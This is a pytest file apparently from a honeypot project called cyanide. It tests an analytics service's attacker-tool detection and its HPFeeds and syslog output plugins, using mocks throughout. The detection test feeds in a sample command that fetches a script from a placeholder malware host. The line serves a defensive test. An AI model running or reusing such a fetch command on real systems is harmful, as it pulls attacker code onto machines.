from unittest.mock import MagicMock, patch

import pytest

try:
    from cyanide.output.hpfeeds import Plugin as HPFeedsPlugin

    HAS_HPFEEDS = True
except ImportError:
    HAS_HPFEEDS = False
from cyanide.output.syslog import Plugin as SyslogPlugin
from cyanide.services.analytics import AnalyticsService


@pytest.mark.asyncio
async def test_analytics_tool_detection():
    service = AnalyticsService({"ml": {"enabled": False}}, MagicMock())
    # Signature: analyze_command(self, cmd: str, src_ip: str, session_id: str, ...)
    service.analyze_command("wget http://malware.com/evil.sh", "1.1.1.1", "sess1")

    # Check tool detection log
    assert any("tool_detection" in str(call) for call in service.logger.log_event.call_args_list)


@pytest.mark.skipif(not HAS_HPFEEDS, reason="hpfeeds not installed")
def test_hpfeeds_output():
    config = {
        "host": "localhost",
        "port": 10000,
        "ident": "id",
        "secret": "sec",
        "channels": ["chan1"],
        "enabled": True,
    }
    with patch("hpfeeds.new") as mock_new:
        mock_client = MagicMock()
        mock_new.return_value = mock_client

        output = HPFeedsPlugin(config)
        output.write({"event": "test"})

        mock_client.publish.assert_called()


def test_syslog_output():
    config = {"address": "/dev/log", "facility": "user", "enabled": True}
    with patch("logging.handlers.SysLogHandler"):
        with patch("socket.socket"):
            output = SyslogPlugin(config)
            output.write({"event": "test"})
            assert output.logger is not None
